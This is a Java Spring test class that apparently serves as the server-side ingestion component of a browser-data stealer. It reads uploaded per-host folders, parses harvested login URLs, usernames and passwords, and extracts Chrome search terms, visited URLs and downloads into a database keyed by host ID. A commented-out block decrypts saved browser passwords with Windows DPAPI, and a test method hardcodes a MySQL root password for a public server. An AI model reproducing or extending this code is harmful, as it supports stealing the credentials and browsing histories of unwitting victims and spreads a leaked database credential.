import com.fasterxml.jackson.databind.ObjectMapper;
import com.jimmy.infaction.common.*;

import java.io.*;
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ScheduledThreadPoolExecutor;
import java.util.concurrent.ThreadPoolExecutor;

import com.jimmy.infaction.job.DeBagJob;
import com.jimmy.infaction.pojo.Browser;
import com.jimmy.infaction.pojo.Browser_download;
import com.jimmy.infaction.pojo.Browser_keyword;
import com.jimmy.infaction.pojo.Browser_url;
import com.jimmy.infaction.service.*;
import com.sun.jna.platform.win32.Crypt32Util;
import org.apache.ibatis.annotations.Param;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.test.annotation.Commit;
import org.springframework.test.annotation.Rollback;
import org.springframework.test.context.ContextConfiguration;
import org.springframework.test.context.junit4.AbstractTransactionalJUnit4SpringContextTests;
import org.springframework.test.context.junit4.SpringJUnit4ClassRunner;

import org.springframework.test.context.web.WebAppConfiguration;
import org.springframework.transaction.annotation.Transactional;


@RunWith(SpringJUnit4ClassRunner.class)
@ContextConfiguration(locations = "classpath:spring/spring-*.xml")
@WebAppConfiguration("src/main/resources")
@Transactional
public class Debag extends AbstractTransactionalJUnit4SpringContextTests  {
	@Autowired
	private ObjectMapper jsonMapper;
	@Autowired
	private MachineService machineService ;
	@Autowired
	private BrowserService browserService ;
	@Autowired
	private BrowserKeywordService browserKeywordService ;
	@Autowired
	private BrowserDownloadService browserDownloadService ;
	@Autowired
	private BrowserUrlService  browserUrlService ;
	@Autowired
	private EventService eventService ;
	@Test
	@Rollback(false)
	public  void  t1()  {
		String rootPath = "F:\\workspace\\infaction\\upload\\";
		File dir = new File(rootPath);
		File[] files = dir.listFiles();
		for (File f : files) {
			String hostid = f.getName().substring(0,36);
			String brtype =  f.getName().substring((f.getName().lastIndexOf("-"))+1);
			if (!(f.getName().matches(".*.zip")) && !(f.getName().matches(".*favb.txt"))) {
				for (File ff : f.listFiles()) {
					boolean exist = machineService.isExist(f.getName());
					// update
					if (exist){
						browserService.deleteExit(hostid,brtype);
						browserDownloadService.deleteExit(hostid,brtype);
						browserKeywordService.deleteExit(hostid,brtype);
						browserUrlService.deleteExit(hostid,brtype);
					}
					int num = 10;
					try {
						switch (ff.getName()){
							case "login.txt":
								File file = new File(rootPath + f.getName()+"\\" +"login.txt");
//								File file = new File(rootPath + f.getName()+"/" +"login.txt");
								InputStreamReader read = null;
								BufferedReader reader = null;
								try {
									read = new InputStreamReader(new FileInputStream(file), "utf-8");
									reader = new BufferedReader(read);
									String line;
									while ((line = reader.readLine()) != null) {
										if (line.equals("")) ;
										else {
											Browser browser = new Browser();
											Map map = jsonMapper.readValue(line, Map.class);
											browser.setOrigin_url((String) map.get("origin_url"));
											browser.setAction_url((String) map.get("action_url"));
											browser.setUser((String) map.get("user"));
											browser.setPassword((String) map.get("password"));
											browser.setBrwtype(brtype);
											browser.setHostid(hostid);
											browserService.insert(browser);
										}
									}
									read.close();
									file.delete();
								} catch (UnsupportedEncodingException e) {
									e.printStackTrace();
								} catch (IOException e) {
									e.printStackTrace();
								} finally {
									read.close();
								}
								break;
							case "History":
//								SqliteHelper hi = new SqliteHelper(rootPath+f.getName()+"/"+"History");
								SqliteHelper hi = new SqliteHelper(rootPath + f.getName() + "\\" + "History");
								List<HistoryKeyResult> HkList = hi.executeQueryList("Select  lower_term FROM keyword_search_terms", HistoryKeyResult.class);
								int klength = HkList.size();
								int kbaseNum = klength / num;
								int kremainderNum = klength % num;
								int kend = 0;
								for (int i = 0; i < num; i++) {
									int start = kend;
									kend = start + kbaseNum;
									if (i == (num - 1)) {
										kend = klength;
									} else if (i < kremainderNum) {
										kend = kend + 1;
									}
									ExecMultiBag thread = new ExecMultiBag("线程[" + (i + 1) + "] ", HkList, start, kend, hostid,brtype, browserKeywordService);
									thread.start();
								}
								List<HistoryUrlResult> HList = hi.executeQueryList("Select url, title, visit_count FROM urls", HistoryUrlResult.class);
								int length = HList.size();
								int baseNum = length / num;
								int remainderNum = length % num;
								int end = 0;
								for (int ki = 0; ki < num; ki++) {
									int start = end;
									end = start + baseNum;
									if (ki == (num - 1)) {
										end = length;
									} else if (ki < remainderNum) {
										end = end + 1;
									}
									ExecMultiBag thread = new ExecMultiBag("线程[" + (ki + 1) + "] ", HList, start, end, hostid,brtype, browserUrlService);
									thread.start();
								}
								List<HistoryDownloadResult> HdList = hi.executeQueryList("Select  current_path,tab_url FROM downloads", HistoryDownloadResult.class);
								int dlength = HdList.size();
								int dbaseNum = dlength / num;
								int dremainderNum = dlength % num;
								int dend = 0;
								for (int di = 0; di < num; di++) {
									int start = dend;
									dend = start + dbaseNum;
									if (di == (num - 1)) {
										dend = dlength;
									} else if (di < dremainderNum) {
										dend = dend + 1;
									}
									ExecMultiBag thread = new ExecMultiBag("线程[" + (di + 1) + "] ", HdList, start, dend, hostid, brtype,browserDownloadService);
									thread.start();
								}
								ff.delete();
								break;
							case "Cookies":
								ff.delete();
								break;
//								System.out.println(ff.getName());
							default:
								ff.delete();
								break;
						}
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
				f.delete();
			}
		}
	}
	class ExecMultiBag extends Thread {
		private String threadName;
		private List<HistoryKeyResult> hklist;
		private List<HistoryUrlResult> hllist;
		private List<HistoryDownloadResult> hdlist;
		private List<SqlLiteDemoResult> Llist;
		private BrowserUrlService browserUrlService;
		private BrowserDownloadService browserDownloadService;
		private BrowserKeywordService browserKeywordService;
		private BrowserService browserService;
		private int startIndex;
		private int endIndex;
		private String hostid;
		private String brtype;

		public ExecMultiBag(String threadName, List list, int startIndex, int endIndex, String hostid,String brtype ,Object service) {
			this.threadName = threadName;
			this.hostid = hostid;
			this.brtype = brtype;
			this.startIndex = startIndex;
			this.endIndex = endIndex;
			if (list.toString().matches("(.*)KeyResult(.*)")) {
				this.hklist = list;
				this.browserKeywordService = (BrowserKeywordService) service;
			} else if (list.toString().matches("(.*)UrlResult(.*)")) {
				this.hllist = list;
				this.browserUrlService = (BrowserUrlService) service;
			} else if (list.toString().matches("(.*)DownloadResult(.*)")) {
				this.hdlist = list;
				this.browserDownloadService = (BrowserDownloadService) service;
			}
//			else if(list.toString().matches("(.*)SqlLiteDemoResult(.*)")) {
//				this.Llist = list;
//				this.browserService = (BrowserService) service;
//			}
		}

		@Override
		public void run() {
//			if (null != Llist) {
//				List<SqlLiteDemoResult> LList = Llist.subList(startIndex, endIndex);
//				for (SqlLiteDemoResult result : LList) {
//					Browser browser = new Browser();
//					browser.setWebsite(result.getAction_url());
//					browser.setUser(result.getUsername_value());
//					browser.setPassword(new String(Crypt32Util.cryptUnprotectData(result.getPassword_value())));
//					browser.setPassword(new String(result.getPassword_value()));
//					browser.setHostid(hostid);
//					browserService.insert(browser);
//				}
//			}
			if (null != hklist) {
				List<HistoryKeyResult> kList = hklist.subList(startIndex, endIndex);
//				System.out.println(threadName + "处理了" + kList.size() + "条！startIndex:" + startIndex + "|endIndex:" + endIndex);
				for (HistoryKeyResult result : kList) {
					Browser_keyword browser_keyword = new Browser_keyword();
					browser_keyword.setKeyword(result.getKey());
					browser_keyword.setHostid(hostid);
					browser_keyword.setBrwtype(brtype);
					browserKeywordService.insert(browser_keyword);
				}
			} else if (null != hllist) {
				List<HistoryUrlResult> lList = hllist.subList(startIndex, endIndex);
//				System.out.println(threadName + "处理了" + lList.size() + "条！startIndex:" + startIndex + "|endIndex:" + endIndex);
				for (HistoryUrlResult result : lList) {
					Browser_url browser_url = new Browser_url();
					browser_url.setWebsite(result.getWebsite());
					browser_url.setTitle(result.getTitle());
					browser_url.setVisit(result.getVisit());
					browser_url.setBrwtype(brtype);
					browser_url.setHostid(hostid);
					browserUrlService.insert(browser_url);
				}
			} else if (null != hdlist) {
				List<HistoryDownloadResult> dList = hdlist.subList(startIndex, endIndex);
//				System.out.println(threadName + "处理了" + dList.size() + "条！startIndex:" + startIndex + "|endIndex:" + endIndex);
				for (HistoryDownloadResult result : dList) {
					Browser_download browser_download = new Browser_download();
					browser_download.setUrl(result.getTab_url());
					browser_download.setPath(result.getCurrent_path());
					browser_download.setBrwtype(brtype);
					browser_download.setHostid(hostid);
					browserDownloadService.insert(browser_download);
				}
			}
		}
	}
//I dont understand rollback [true] why can commit?  java.sql.SQLException: Can't call commit when autocommit=true
	@Test
//	@Rollback()
	public void jFactory () throws SQLException, ClassNotFoundException, IllegalAccessException, InstantiationException {
		Class.forName("com.mysql.jdbc.Driver").newInstance();
		try{
			String sql = " insert into browser_download ( url, hostid, path ) values ('fasfsdaf','e5b51039-15d7-47a7-9470-adf9888dee3c','fdsafsaf')";
			Connection conn = DriverManager.getConnection(
					"jdbc:mysql://111.231.82.173:3306/infaction", "root", "zxc123");
			Statement stmt = conn.createStatement();
			stmt.execute(sql);
//			conn.commit();
			conn.close();
		}catch (Exception e){
			e.printStackTrace();
		}
	}

	@Test
	public void Arg() throws Exception{
		browserService.deleteExit( "aaa","aaa");
	}

}
